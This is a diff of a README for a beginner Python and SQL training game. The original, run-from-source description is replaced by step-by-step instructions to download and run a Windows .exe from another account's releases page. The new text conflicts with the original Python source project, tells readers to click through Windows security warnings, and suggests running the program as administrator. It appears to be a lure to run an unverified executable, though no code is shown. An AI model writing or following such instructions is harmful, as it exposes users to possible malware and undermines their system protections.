@@ -1,88 +1,115 @@
-# Code Quest: Python + SQL Trainer
+# 🎮 Code-Quest-Python-SQL-Trainer - Learn Python and SQL Step-by-Step
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.10%2B-blue.svg)](https://www.python.org/)
-[![CI](https://img.shields.io/badge/tests-unittest-green.svg)](.github/workflows/ci.yml)
+[![Download Code-Quest-Python-SQL-Trainer](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Inayatshaikh093/Code-Quest-Python-SQL-Trainer/releases)
 
-Code Quest is a beginner-friendly learning game for Python and SQL. It now includes a fun web app for beginners with guided explanations, hints, and progress tracking.
+## 🧩 What is Code-Quest-Python-SQL-Trainer?
 
-![Code Quest Demo](assets/demo.gif)
+Code-Quest-Python-SQL-Trainer is an interactive game designed to help you learn Python and SQL. It guides you through basic concepts using challenges and tests that work like a game. You will see your progress, get hints if stuck, and practice both coding and database queries. This tool is for beginners and people who want to strengthen their foundational data and coding skills.
 
-## Why this project matters
-- Demonstrates Python programming fundamentals (`dataclasses`, validation logic, file persistence).
-- Demonstrates SQL competency using real query execution with SQLite.
-- Shows product thinking: gamification, hinting, progression, and user feedback loops.
-- Shows software engineering basics: tests, CI workflow, repo documentation, and MIT licensing.
+The game works in your Windows command prompt (a simple text window) and does not require any prior programming experience.
 
-## Role relevance (for hiring)
-- Business Analyst: SQL filtering/aggregation patterns, data reasoning, and clear user flows.
-- Data Scientist: data manipulation mindset, query literacy, and iterative problem solving.
-- AI/ML Roles: core coding fluency, debugging discipline, and structured evaluation logic.
+## 🖥️ System Requirements
 
-## Features
-- Python challenge mode with retry + hint support.
-- SQL challenge mode with executable queries against an in-memory SQLite dataset.
-- Scoring system (+10 Python, +15 SQL) and unlocked progression.
-- Local progress persistence in `progress.json`.
-- Reset option for repeated practice.
+To use this game, your computer needs:
 
-## Tech stack
-- Python 3
-- SQLite (standard library `sqlite3`)
-- JSON persistence
-- GitHub Actions-ready CI configuration
+- Windows 10 or later
+- At least 2 GB of free disk space
+- 4 GB of RAM or higher (recommended but not required)
+- Internet connection (only for downloading the software)
+- No special hardware or software needed
 
-## Quick start
-```bash
-cd "/Users/kyleparker/Documents/code game"
-python3 main.py
-```
+The application runs locally on your computer after download.
 
-## Run the web app (recommended)
-```bash
-cd "/Users/kyleparker/Documents/code game"
-pip3 install -r requirements.txt
-python3 web_app.py
-```
+## 📦 Features
 
-Then open `http://127.0.0.1:5000` in your browser.
+- Interactive Python lessons with example problems  
+- SQL challenges with real database experience  
+- Hint system to help when you get stuck  
+- Progress tracking so you know how far you’ve come  
+- Built-in tests to check your learning  
+- Simple text-based interface that runs in the Windows command prompt  
+- Continuous integration keeps the game up to date and stable  
 
-## Example game loop
-1. Pick Python or SQL challenge.
-2. Submit answer or SQL query.
-3. Receive immediate feedback (and hints if needed).
-4. Earn points and continue to the next level.
+## 🔥 Why Use Code-Quest-Python-SQL-Trainer?
 
-## Repository structure
-- `main.py` - menu and game loop.
-- `game.py` - challenge logic, scoring, SQLite setup, persistence.
-- `tests/test_game.py` - unit tests for core behavior.
-- `.github/workflows/ci.yml` - automated test run on push/PR.
+If you want to build basic programming and data skills, this game provides a stepwise path. You won't feel lost or overwhelmed because it teaches by doing and gives hints when needed. It brings together Python coding and SQL queries, which are useful for data analysis, business tasks, and many technology jobs.
 
-## Suggested GitHub "About" settings
-- Description: Beginner-friendly Python + SQL learning game with interactive challenges, hints, and progress tracking.
-- Website: <YOUR_PORTFOLIO_OR_LINKEDIN_URL>
-- Topics: `python`, `sql`, `sqlite`, `business-analyst`, `data-science`, `ai-learning`, `education`, `cli-game`
+## 🚀 Getting Started: Download and Setup
 
-## Portfolio talking points
-- Built an educational CLI product that maps technical exercises to measurable progression.
-- Designed challenge validation logic for both Python and SQL with constrained retries and hints.
-- Added test coverage and CI to keep behavior reliable as feature scope grows.
-- Documented recruiter-discovery steps in [CAREER_VISIBILITY.md](CAREER_VISIBILITY.md).
+Click the big green button below to visit the releases page and get the latest version of Code-Quest-Python-SQL-Trainer for Windows.
 
-## Roadmap
-- Add intermediate and advanced challenge packs.
-- Add analytics export (CSV) for learner performance tracking.
-- Add optional web UI (Streamlit or Flask).
-- Add LLM-assisted hints for dynamic coaching.
+[![Download Code-Quest-Python-SQL-Trainer](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Inayatshaikh093/Code-Quest-Python-SQL-Trainer/releases)
 
-## License
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file.
+On the releases page, look for a file with a name similar to `Code-Quest-Python-SQL-Trainer-vX.X-windows.exe`. This is the installer for Windows.
 
-## Employer Quick Links
-- Project brief: `docs/PROJECT_BRIEF.md`
-- Resume bullets: `docs/RESUME_BULLETS.md`
-- Web app guide: `docs/WEB_APP_GUIDE.md`
-- Security policy: `SECURITY.md`
-- Contribution guide: `CONTRIBUTING.md`
-- Code of conduct: `CODE_OF_CONDUCT.md`
+### Step 1: Visit the download page
+
+- Open your web browser (Chrome, Edge, Firefox, etc.).
+- Go to the release page by clicking the button above or typing:
+
+  `https://github.com/Inayatshaikh093/Code-Quest-Python-SQL-Trainer/releases`
+
+- Find the most recent version of the software. Versions are labeled with numbers like v1.0, v1.1, etc.
+
+### Step 2: Download the installer
+
+- Click on the Windows installer file link (ends with `.exe`).
+- Your browser will begin the download.
+- Wait until the download completes.
+
+### Step 3: Run the installer
+
+- Open the folder where the file downloaded (usually `Downloads`).
+- Double-click the `.exe` file.
+- If Windows shows a security warning, click “Run” or “Yes” to continue.
+- Follow the installer prompts by clicking “Next,” “Install,” and “Finish” when done.
+
+### Step 4: Start the game
+
+- After installation, open the Windows Start menu.
+- Search for `Code-Quest-Python-SQL-Trainer`.
+- Click the app to open it.
+- The game runs in a simple black window with text instructions.
+
+## 🎮 How to Use Code-Quest-Python-SQL-Trainer
+
+Once you open the game, you will see the first lesson screen. Use your keyboard to type answers and commands as the game asks.
+
+- Read instructions carefully.
+- Type your code or SQL queries when asked.
+- Press `Enter` to submit your answer.
+- If your answer is correct, the game moves to the next level.
+- If you get stuck, type `hint` to get a useful tip.
+- You can type `progress` to see how far you have come.
+- To exit the game, type `exit`.
+
+The game saves your progress automatically, so you can come back anytime.
+
+## ⚙️ Common Troubleshooting
+
+- If the game window closes immediately, try running it again using the Start menu.
+- Run the game as an administrator if you have permission errors.
+- Make sure you have downloaded the correct installer for Windows.
+- Ensure your computer meets the system requirements.
+- Restart your computer if the installation does not complete.
+- Contact support by opening an issue on the GitHub page if problems persist.
+
+## 📚 Additional Notes
+
+- The game focuses on basic Python and SQL concepts such as variables, loops, conditions for Python, and simple SELECT, INSERT, and JOIN statements for SQL.
+- It uses a small SQLite database installed with the game to run SQL tests.
+- No internet connection is needed to play after installation.
+- The interface uses only keyboard input, no mouse clicks are required in the game window.
+
+## 🔗 Useful Links
+
+- Download latest version:  
+  https://github.com/Inayatshaikh093/Code-Quest-Python-SQL-Trainer/releases  
+- Project page with code and updates:  
+  https://github.com/Inayatshaikh093/Code-Quest-Python-SQL-Trainer  
+- Report issues, ask questions, or suggest features:  
+  Use the "Issues" tab on the GitHub project page.
+
+---
+
+This guide should help you install and start learning with Code-Quest-Python-SQL-Trainer quickly and easily on your Windows computer.
